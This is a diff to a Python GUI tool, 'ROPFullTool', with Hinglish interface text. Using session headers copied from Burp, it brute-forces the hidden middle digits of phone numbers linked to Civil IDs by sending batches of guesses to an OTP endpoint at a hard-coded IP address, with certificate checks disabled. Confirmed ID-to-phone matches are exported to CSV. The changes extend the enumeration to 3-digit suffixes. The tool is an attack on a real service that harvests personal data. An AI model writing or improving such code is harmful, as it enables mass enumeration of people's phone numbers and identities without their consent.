@@ -24,7 +24,6 @@ class ROPFullTool:
     self.session.verify = False
 
     self.token_lock = threading.Lock()
-
     self.host = "5.37.58.147"
 
     self.otp_results = []
@@ -43,7 +42,7 @@ class ROPFullTool:
     self.burp_entry.insert(tk.END, sample_header)
     self.status_label.config(text="✅ READY", fg="#00ff88")
     self.token_status.config(
-        text="Multi-Number Sequential Checking Enabled!"
+        text="Multi-Number Sequential Checking Enabled (3 & 4 Digits Support)!"
     )
 
   def parse_header(self):
@@ -128,19 +127,21 @@ class ROPFullTool:
       parts = re.split(r"[,;\s]+", line)
       if len(parts) >= 2:
         cid = parts[0].strip()
-        last4 = parts[1].strip()
+        suffix = parts[1].strip()
         if (
             cid.isdigit()
-            and last4.isdigit()
-            and len(last4) == 4
+            and suffix.isdigit()
+            and (len(suffix) == 3 or len(suffix) == 4)
             and cid not in seen_ids
         ):
           seen_ids.add(cid)
-          tasks_list.append((cid, last4))
+          tasks_list.append((cid, suffix))
 
     if not tasks_list:
       messagebox.showerror(
-          "Error", "Koi valid format nahi mila! Sahi format: CivilID, Last4Digits"
+          "Error",
+          "Koi valid format nahi mila! Sahi format: CivilID, LastDigits (3 or"
+          " 4 digits)",
       )
       return
 
@@ -196,7 +197,6 @@ class ROPFullTool:
 
         matched_in_this_id = False
 
-        # Iterate through EACH masked number entry in the response
         for masked_num, token_val in mobile_dict.items():
           if self.stop_requested or matched_in_this_id:
             break
@@ -213,7 +213,11 @@ class ROPFullTool:
               ),
           )
 
-          phone_numbers = [f"{prefix}{i:02d}{suffix}" for i in range(100)]
+          if len(suffix) == 3:
+            phone_numbers = [f"{prefix}{i:03d}{suffix}" for i in range(10)]
+          else:
+            phone_numbers = [f"{prefix}{i:02d}{suffix}" for i in range(100)]
+
           batch_size = 5
 
           for i in range(0, len(phone_numbers), batch_size):
@@ -274,7 +278,6 @@ class ROPFullTool:
 
     try:
       url = f"https://{self.host}/otp"
-
       payload = {"mobile": {phone: token_val}, "civilId": civil_id_token}
       headers = self.get_headers()
 
@@ -299,7 +302,7 @@ class ROPFullTool:
 
   def export_csv(self):
     if not self.otp_results:
-      messagebox.showwarning("Warning", "Koi data available nahi hai!")
+      messagebox.showwarning("Warning", "Koi matched data available nahi hai!")
       return
 
     file_path = filedialog.asksaveasfilename(
@@ -313,7 +316,7 @@ class ROPFullTool:
           writer.writerow(["Civil ID", "Phone Number"])
           for r in self.otp_results:
             writer.writerow([r["civil_id"], r["phone"]])
-        messagebox.showinfo("Success", "Data CSV mein export ho gaya!")
+        messagebox.showinfo("Success", "Matched Data CSV mein export ho gaya!")
       except Exception as e:
         messagebox.showerror("Error", f"Masla aaya: {str(e)}")
 
@@ -331,7 +334,7 @@ class ROPFullTool:
       try:
         with open(file_path, mode="w", newline="", encoding="utf-8") as f:
           writer = csv.writer(f)
-          writer.writerow(["Civil ID", "Last 4 Digits"])
+          writer.writerow(["Civil ID", "Last Digits"])
           for r in self.unmatched_results:
             writer.writerow([r["civil_id"], r["last_four"]])
         messagebox.showinfo("Success", "Not Match Numbers CSV mein save ho gaye!")
@@ -398,7 +401,7 @@ class ROPFullTool:
 
     baf = tk.LabelFrame(
         main_frame,
-        text="Batch Search (CivilID, Last4Digits per line)",
+        text="Batch Search (CivilID, Last 3 or 4 Digits per line)",
         bg="#2d2d2d",
         fg="white",
         font=("Arial", 10, "bold"),
@@ -409,7 +412,7 @@ class ROPFullTool:
         baf, height=4, bg="#1a1a1a", fg="#00ff88", font=("Consolas", 10)
     )
     self.batch_entry.pack(fill=tk.X, padx=5, pady=3)
-    self.batch_entry.insert(tk.END, "5701982, 1944\n")
+    self.batch_entry.insert(tk.END, "5701982, 944\n")
 
     br_frame = tk.Frame(baf, bg="#2d2d2d")
     br_frame.pack(fill=tk.X, pady=3)
@@ -459,7 +462,7 @@ class ROPFullTool:
 
     tf = tk.LabelFrame(
         main_frame,
-        text="Matched Results Table",
+        text="Matched Results Table (Live Updates)",
         bg="#2d2d2d",
         fg="white",
         font=("Arial", 10, "bold"),
@@ -492,7 +495,7 @@ class ROPFullTool:
         bg="#aa5500",
         fg="white",
         font=("Arial", 9, "bold"),
-    ),
+    ).pack(side=tk.LEFT, padx=5)
     tk.Button(
         bf, text="CLEAR", command=self.clear_all, bg="#ff4444", fg="white"
     ).pack(side=tk.LEFT, padx=5)
